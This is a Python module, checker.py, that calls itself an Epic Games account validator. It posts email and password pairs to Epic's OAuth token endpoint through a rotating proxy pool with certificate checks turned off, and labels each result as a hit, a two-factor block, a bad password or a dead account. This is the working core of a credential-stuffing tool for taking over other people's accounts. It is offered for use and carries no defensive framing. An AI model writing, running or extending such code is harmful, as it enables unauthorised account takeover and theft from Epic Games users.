"""
checker.py — Epic Games account validator
Session-per-thread via threading.local() — no fresh connection per call.
Proxy is pulled from the global pool on each call.
"""
import threading
import requests
import urllib3

from config     import EPIC_TOKEN_URL, EPIC_HEADERS, ERR_MAP, TIMEOUT
from proxy_pool import pool as proxy_pool

urllib3.disable_warnings()

# one Session object per thread — reuses TCP connections
_local = threading.local()


def _session() -> requests.Session:
    if not hasattr(_local, "s"):
        s = requests.Session()
        s.headers.update(EPIC_HEADERS)
        s.verify = False
        _local.s = s
    return _local.s


def check_epic(email: str, password: str) -> str:
    """
    Attempt login via Epic Games OAuth.
    Proxy is automatically pulled from the global ProxyPool (round-robin).

    Returns one of:
        HIT   — logged in successfully
        2FA   — blocked by two-factor auth
        BAD   — wrong password
        DEAD  — account does not exist / inactive
        RETRY — throttled (caller should re-queue)
        ERROR — network error / unexpected response
    """
    proxy   = proxy_pool.next()          # None if no proxies loaded
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        r = _session().post(
            EPIC_TOKEN_URL,
            data={
                "grant_type": "password",
                "username":   email,
                "password":   password,
                "token_type": "eg1",
            },
            proxies=proxies,
            timeout=TIMEOUT,
        )

        if r.status_code == 200:
            return "HIT"

        body = (
            r.json()
            if r.headers.get("content-type", "").startswith("application/json")
            else {}
        )
        err = body.get("errorCode", "")
        return ERR_MAP.get(err, "ERROR")

    except requests.exceptions.Timeout:
        return "ERROR"
    except Exception:
        return "ERROR"
